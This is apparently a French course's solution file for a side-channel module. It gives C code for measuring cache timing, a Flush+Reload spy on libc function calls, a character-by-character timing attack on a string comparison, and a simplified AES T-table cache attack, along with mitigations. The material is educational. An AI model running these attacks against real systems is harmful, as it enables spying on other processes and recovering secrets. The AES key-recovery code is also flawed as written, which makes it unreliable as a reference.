# Solutions - Side Channel Introduction

## Exercice 1 : Mesurer le temps d'accès cache (Très facile)

**Objectif** : Démontrer la différence de temps entre un hit et un miss cache.

### Solution

```c
/*
 * Mesure de temps d'accès cache (hit vs miss)
 *
 * Compilation : gcc -o cache_timing cache_timing.c -O0
 * Usage : ./cache_timing
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64
#define ITERATIONS 1000

// Mesurer le temps d'accès à une adresse (en cycles CPU)
uint64_t measure_access_time(volatile uint8_t* addr) {
    uint64_t start, end;
    uint32_t aux;

    // Barrière mémoire pour éviter le réordonnancement
    _mm_mfence();

    // Mesure avec RDTSCP (plus précis que RDTSC)
    start = __rdtscp(&aux);
    *(volatile uint8_t*)addr;  // Accès mémoire
    end = __rdtscp(&aux);

    _mm_mfence();

    return end - start;
}

// Statistiques simples
typedef struct {
    uint64_t min;
    uint64_t max;
    uint64_t avg;
} Stats;

Stats calculate_stats(uint64_t* timings, int count) {
    Stats stats = {.min = UINT64_MAX, .max = 0, .avg = 0};
    uint64_t sum = 0;

    for (int i = 0; i < count; i++) {
        if (timings[i] < stats.min) stats.min = timings[i];
        if (timings[i] > stats.max) stats.max = timings[i];
        sum += timings[i];
    }

    stats.avg = sum / count;
    return stats;
}

int main() {
    printf("[*] Mesure de timing cache\n");
    printf("[*] ======================\n\n");

    // Allouer une page mémoire
    uint8_t* data = aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE);
    if (!data) {
        perror("aligned_alloc");
        return 1;
    }

    memset(data, 0x42, CACHE_LINE_SIZE);

    uint64_t cold_timings[ITERATIONS];
    uint64_t hot_timings[ITERATIONS];
    uint64_t flushed_timings[ITERATIONS];

    printf("[*] Collecte de %d mesures...\n\n", ITERATIONS);

    for (int i = 0; i < ITERATIONS; i++) {
        // 1. Cold cache (premier accès)
        _mm_clflush(data);
        _mm_mfence();
        cold_timings[i] = measure_access_time(data);

        // 2. Hot cache (second accès, déjà en cache)
        hot_timings[i] = measure_access_time(data);

        // 3. Flush puis accès
        _mm_clflush(data);
        _mm_mfence();
        flushed_timings[i] = measure_access_time(data);
    }

    // Calculer les statistiques
    Stats cold_stats = calculate_stats(cold_timings, ITERATIONS);
    Stats hot_stats = calculate_stats(hot_timings, ITERATIONS);
    Stats flushed_stats = calculate_stats(flushed_timings, ITERATIONS);

    // Afficher les résultats
    printf("[*] Résultats (en cycles CPU)\n");
    printf("==============================\n\n");

    printf("Cold cache (miss) :\n");
    printf("  Min : %3lu cycles\n", cold_stats.min);
    printf("  Avg : %3lu cycles\n", cold_stats.avg);
    printf("  Max : %3lu cycles\n", cold_stats.max);
    printf("\n");

    printf("Hot cache (hit) :\n");
    printf("  Min : %3lu cycles\n", hot_stats.min);
    printf("  Avg : %3lu cycles\n", hot_stats.avg);
    printf("  Max : %3lu cycles\n", hot_stats.max);
    printf("\n");

    printf("After flush (miss) :\n");
    printf("  Min : %3lu cycles\n", flushed_stats.min);
    printf("  Avg : %3lu cycles\n", flushed_stats.avg);
    printf("  Max : %3lu cycles\n", flushed_stats.max);
    printf("\n");

    // Analyse
    printf("[*] Analyse\n");
    printf("===========\n\n");

    uint64_t threshold = (cold_stats.avg + hot_stats.avg) / 2;
    printf("Seuil détection (moyenne) : %lu cycles\n\n", threshold);

    printf("Si temps < %lu cycles → HIT (donnée en cache)\n", threshold);
    printf("Si temps > %lu cycles → MISS (donnée en RAM)\n\n", threshold);

    float speedup = (float)cold_stats.avg / hot_stats.avg;
    printf("Speedup cache : %.2fx plus rapide\n", speedup);

    printf("\n[*] Application offensive\n");
    printf("=========================\n\n");
    printf("Cette différence de timing peut être exploitée pour :\n");
    printf("  1. Flush+Reload : Espionner les accès mémoire\n");
    printf("  2. Prime+Probe : Détecter l'activité dans les sets de cache\n");
    printf("  3. Spectre/Meltdown : Exfiltrer des données via le cache\n");

    free(data);
    return 0;
}
```

**Résultats typiques** :
```
Cold cache (miss) :
  Min : 150 cycles
  Avg : 180 cycles
  Max : 250 cycles

Hot cache (hit) :
  Min : 3 cycles
  Avg : 4 cycles
  Max : 12 cycles
```

---

## Exercice 2 : Implémenter Flush+Reload basique (Facile)

**Objectif** : Espionner l'accès à une fonction partagée.

### Solution

```c
/*
 * Attaque Flush+Reload - Espionner une fonction
 *
 * Compilation : gcc -o flush_reload flush_reload.c -ldl
 * Usage : ./flush_reload
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <dlfcn.h>

#define THRESHOLD 80  // Seuil hit/miss en cycles
#define PROBE_INTERVAL 10000  // Interval entre probes (microsec)

// Mesurer le temps d'accès
uint64_t probe(volatile void* addr) {
    uint64_t start, end;
    uint32_t aux;

    _mm_mfence();
    start = __rdtscp(&aux);
    *(volatile char*)addr;
    end = __rdtscp(&aux);
    _mm_mfence();

    return end - start;
}

// Spy sur une fonction de libc
void spy_on_function(const char* func_name, int duration_sec) {
    printf("[*] Espionnage de %s pendant %d secondes...\n\n", func_name, duration_sec);

    // Obtenir l'adresse de la fonction
    void* handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle) {
        printf("[-] Erreur dlopen: %s\n", dlerror());
        return;
    }

    void* func_addr = dlsym(handle, func_name);
    if (!func_addr) {
        printf("[-] Fonction %s non trouvée\n", func_name);
        dlclose(handle);
        return;
    }

    printf("[+] Adresse de %s : %p\n\n", func_name, func_addr);
    printf("[*] Début du monitoring (THRESHOLD = %d cycles)\n", THRESHOLD);
    printf("    Format : [timestamp] fonction appelée (temps d'accès)\n\n");

    int detection_count = 0;
    uint64_t start_time = time(NULL);

    while (time(NULL) - start_time < duration_sec) {
        // 1. Flush
        _mm_clflush(func_addr);
        _mm_mfence();

        // 2. Wait
        usleep(PROBE_INTERVAL);

        // 3. Reload
        uint64_t access_time = probe(func_addr);

        // 4. Analyze
        if (access_time < THRESHOLD) {
            printf("[%lu] %s() APPELÉE (t=%lu cycles)\n",
                   time(NULL) - start_time, func_name, access_time);
            detection_count++;
        }
    }

    printf("\n[*] Monitoring terminé\n");
    printf("[+] Détections : %d\n", detection_count);

    dlclose(handle);
}

// Programme victime (dans un thread séparé ou processus)
void* victim_thread(void* arg) {
    printf("[Victime] Thread démarré, appel périodique de malloc()...\n");

    while (1) {
        void* ptr = malloc(1024);
        free(ptr);
        usleep(500000);  // Toutes les 500ms
    }

    return NULL;
}

int main(int argc, char** argv) {
    printf("[*] Attaque Flush+Reload\n");
    printf("[*] ====================\n\n");

    if (argc < 2) {
        printf("Usage: %s <fonction>\n", argv[0]);
        printf("Exemples:\n");
        printf("  %s malloc\n", argv[0]);
        printf("  %s printf\n", argv[0]);
        printf("  %s strcmp\n", argv[0]);
        printf("\n");
        printf("Note : Lancez un programme qui utilise cette fonction\n");
        printf("       dans un autre terminal pour voir les détections.\n");
        return 1;
    }

    const char* target_func = argv[1];

    // Lancer le spy
    spy_on_function(target_func, 10);  // 10 secondes

    return 0;
}
```

**Utilisation** :
```bash
# Terminal 1 : Lancer le spy
./flush_reload malloc

# Terminal 2 : Lancer un programme qui utilise malloc()
while true; do ls -la > /dev/null; sleep 0.5; done
```

---

## Exercice 3 : Attaque timing sur comparaison de string (Moyen)

**Objectif** : Exploiter une comparaison non-constant-time pour retrouver un secret.

### Solution

```c
/*
 * Attaque timing sur comparaison de string
 *
 * Compilation : gcc -o timing_attack timing_attack.c
 * Usage : ./timing_attack
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#define SECRET_LEN 8
#define SAMPLES 1000

// Fonction vulnérable (early return)
int check_password_vulnerable(const char* input, const char* secret) {
    for (int i = 0; i < SECRET_LEN; i++) {
        if (input[i] != secret[i]) {
            return 0;  // Early return → leak timing !
        }
    }
    return 1;
}

// Mesurer le temps de vérification
uint64_t measure_check_time(const char* input, const char* secret) {
    uint64_t start, end;
    uint32_t aux;

    // Flush caches pour des mesures propres
    _mm_clflush((void*)input);
    _mm_clflush((void*)secret);
    _mm_mfence();

    start = __rdtscp(&aux);
    check_password_vulnerable(input, secret);
    end = __rdtscp(&aux);

    return end - start;
}

// Moyenner plusieurs mesures pour réduire le bruit
uint64_t average_timing(const char* input, const char* secret, int samples) {
    uint64_t total = 0;

    for (int i = 0; i < samples; i++) {
        total += measure_check_time(input, secret);
    }

    return total / samples;
}

// Attaque timing pour retrouver le secret caractère par caractère
void timing_attack(const char* secret) {
    char guess[SECRET_LEN + 1] = {0};
    memset(guess, 'a', SECRET_LEN);

    printf("[*] Attaque timing en cours...\n");
    printf("[*] Secret réel : %s (caché)\n\n", secret);

    for (int pos = 0; pos < SECRET_LEN; pos++) {
        printf("[*] Position %d : ", pos);

        uint64_t max_time = 0;
        char best_char = 'a';

        // Tester tous les caractères possibles
        for (char c = 'a'; c <= 'z'; c++) {
            guess[pos] = c;

            uint64_t avg_time = average_timing(guess, secret, SAMPLES);

            // Le bon caractère prend plus de temps (va plus loin dans la comparaison)
            if (avg_time > max_time) {
                max_time = avg_time;
                best_char = c;
            }
        }

        guess[pos] = best_char;
        printf("'%c' (temps: %lu cycles)\n", best_char, max_time);
    }

    printf("\n[+] Secret retrouvé : %s\n", guess);

    if (strcmp(guess, secret) == 0) {
        printf("[+] SUCCÈS : Attaque réussie !\n");
    } else {
        printf("[-] ÉCHEC : Bruit trop élevé, relancer avec plus de samples\n");
    }
}

// Fonction sécurisée (constant-time)
int check_password_secure(const char* input, const char* secret, size_t len) {
    volatile uint8_t diff = 0;

    for (size_t i = 0; i < len; i++) {
        diff |= input[i] ^ secret[i];
    }

    return (diff == 0);
}

// Démonstration de la différence
void demonstrate_vulnerability() {
    const char* secret = "abcdefgh";
    char wrong1[] = "aaaaaaaa";  // 0 caractères corrects
    char wrong2[] = "abcdaaaa";  // 4 caractères corrects
    char correct[] = "abcdefgh";  // 8 caractères corrects

    printf("\n[*] Démonstration de vulnérabilité\n");
    printf("==================================\n\n");

    uint64_t t1 = average_timing(wrong1, secret, SAMPLES);
    uint64_t t2 = average_timing(wrong2, secret, SAMPLES);
    uint64_t t3 = average_timing(correct, secret, SAMPLES);

    printf("Temps vérification (moyenne sur %d essais) :\n", SAMPLES);
    printf("  0 chars corrects : %lu cycles\n", t1);
    printf("  4 chars corrects : %lu cycles\n", t2);
    printf("  8 chars corrects : %lu cycles\n\n", t3);

    printf("Observation : Plus il y a de caractères corrects,\n");
    printf("              plus la fonction prend de temps.\n");
    printf("              → Information leakée via timing !\n");
}

int main() {
    printf("[*] Attaque timing sur comparaison de string\n");
    printf("[*] =========================================\n\n");

    const char secret[] = "password";  // Secret à retrouver

    // Démonstration
    demonstrate_vulnerability();

    // Attaque
    printf("\n");
    timing_attack(secret);

    printf("\n[*] Mitigation : Utiliser une comparaison constant-time\n");
    printf("========================================================\n\n");
    printf("int secure_compare(const char* a, const char* b, size_t len) {\n");
    printf("    volatile uint8_t diff = 0;\n");
    printf("    for (size_t i = 0; i < len; i++) {\n");
    printf("        diff |= a[i] ^ b[i];  // Toujours faire len comparaisons\n");
    printf("    }\n");
    printf("    return (diff == 0);\n");
    printf("}\n");

    return 0;
}
```

**Explication** :
- La fonction vulnérable fait un `return` dès qu'un caractère diffère
- Plus il y a de caractères corrects, plus elle prend de temps avant de return
- On mesure le temps pour chaque caractère possible
- Le caractère qui prend le plus de temps est le bon

---

## Exercice 4 : AES T-table cache attack (Difficile)

**Objectif** : Simuler une attaque cache sur une implémentation AES vulnérable.

### Solution

```c
/*
 * Simulation d'attaque cache sur AES T-tables
 *
 * Compilation : gcc -o aes_cache_attack aes_cache_attack.c -lcrypto
 * Usage : ./aes_cache_attack
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <openssl/aes.h>

#define THRESHOLD 100
#define SAMPLES 100

// Simuler une T-table AES (simplifiée)
uint32_t Te0[256];

// Initialiser les T-tables (valeurs fictives pour la démo)
void init_tables() {
    for (int i = 0; i < 256; i++) {
        Te0[i] = i * 0x01010101;  // Valeur simplifiée
    }
}

// Simuler un round AES (table-based)
void aes_round_simulated(uint8_t* state, uint8_t* key) {
    // Dans un vrai AES, on accèderait à Te0[state[i] ^ key[i]]
    // Ce qui leake l'information via le cache

    for (int i = 0; i < 16; i++) {
        uint8_t index = state[i] ^ key[i];
        uint32_t t = Te0[index];  // Accès table → leak cache
        // ... (calculs AES)
    }
}

// Mesurer l'accès cache
uint64_t probe_table_entry(int index) {
    uint64_t start, end;
    uint32_t aux;

    _mm_mfence();
    start = __rdtscp(&aux);
    *(volatile uint32_t*)&Te0[index];
    end = __rdtscp(&aux);
    _mm_mfence();

    return end - start;
}

// Attaque Flush+Reload sur AES
void attack_aes() {
    uint8_t plaintext[16] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                             0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    uint8_t key[16] = {0x42};  // Clé secrète (à retrouver)

    printf("[*] Attaque cache sur AES T-tables\n");
    printf("===================================\n\n");

    printf("[*] Plaintext (connu) : ");
    for (int i = 0; i < 16; i++) printf("%02X ", plaintext[i]);
    printf("\n");

    printf("[*] Key (secret)      : ");
    for (int i = 0; i < 16; i++) printf("%02X ", key[i]);
    printf("\n\n");

    // Statistiques d'accès aux T-tables
    int access_count[256] = {0};

    printf("[*] Monitoring des accès T-table pendant %d encryptions...\n\n", SAMPLES);

    for (int sample = 0; sample < SAMPLES; sample++) {
        // Flush toutes les entrées de Te0
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&Te0[i]);
        }
        _mm_mfence();

        // Victime encrypte
        aes_round_simulated(plaintext, key);

        // Probe : vérifier quelles entrées ont été accédées
        for (int i = 0; i < 256; i++) {
            uint64_t time = probe_table_entry(i);
            if (time < THRESHOLD) {
                access_count[i]++;
            }
        }
    }

    // Analyser les résultats
    printf("[*] Analyse des accès\n");
    printf("=====================\n\n");

    printf("Indices Te0 les plus accédés (leak de state[i] ^ key[i]) :\n\n");

    for (int i = 0; i < 256; i++) {
        if (access_count[i] > SAMPLES / 4) {  // Seuil arbitraire
            printf("  Te0[0x%02X] : %d accès\n", i, access_count[i]);
        }
    }

    printf("\n[*] Récupération de la clé\n");
    printf("==========================\n\n");

    // Pour le premier byte : state[0] ^ key[0] = index accédé
    // Si on connaît state[0] (plaintext), on peut retrouver key[0]

    uint8_t recovered_key[16];

    for (int byte_pos = 0; byte_pos < 16; byte_pos++) {
        // Trouver l'index le plus accédé pour cette position
        int max_access = 0;
        uint8_t likely_index = 0;

        for (int i = 0; i < 256; i++) {
            if (access_count[i] > max_access) {
                max_access = access_count[i];
                likely_index = i;
            }
        }

        // key[byte_pos] = plaintext[byte_pos] ^ index
        recovered_key[byte_pos] = plaintext[byte_pos] ^ likely_index;
    }

    printf("Clé récupérée : ");
    for (int i = 0; i < 16; i++) {
        printf("%02X ", recovered_key[i]);
    }
    printf("\n");

    printf("\n[*] Note : Cette démonstration est simplifiée.\n");
    printf("    Une vraie attaque nécessite :\n");
    printf("      - Plus de samples (milliers)\n");
    printf("      - Analyse statistique avancée\n");
    printf("      - Correction du bruit\n");
    printf("      - Multiple plaintexts connus\n");
}

int main() {
    printf("[*] Démonstration d'attaque cache sur AES\n");
    printf("[*] ======================================\n\n");

    // Initialiser les tables
    init_tables();

    // Lancer l'attaque
    attack_aes();

    printf("\n[*] Mitigations\n");
    printf("===============\n\n");
    printf("1. AES-NI (instructions hardware)\n");
    printf("   - Pas de T-tables → pas de leak cache\n");
    printf("   - Utilisé par défaut dans OpenSSL moderne\n\n");

    printf("2. Bitslicing\n");
    printf("   - Implémentation sans tables\n");
    printf("   - Constant-time par design\n\n");

    printf("3. Cache partitioning\n");
    printf("   - Isoler les processus sensibles\n");
    printf("   - Intel CAT (Cache Allocation Technology)\n");

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifie que tu peux :

- [x] Mesurer le temps d'accès cache avec RDTSC/RDTSCP
- [x] Distinguer un cache hit d'un cache miss via le timing
- [x] Implémenter une attaque Flush+Reload basique
- [x] Exploiter un timing leak dans une comparaison de string
- [x] Comprendre les attaques sur AES (T-tables)
- [x] Appliquer les contre-mesures (constant-time, AES-NI)

**Module suivant** : [A12 - Spectre & Meltdown](../A12_spectre_meltdown/)
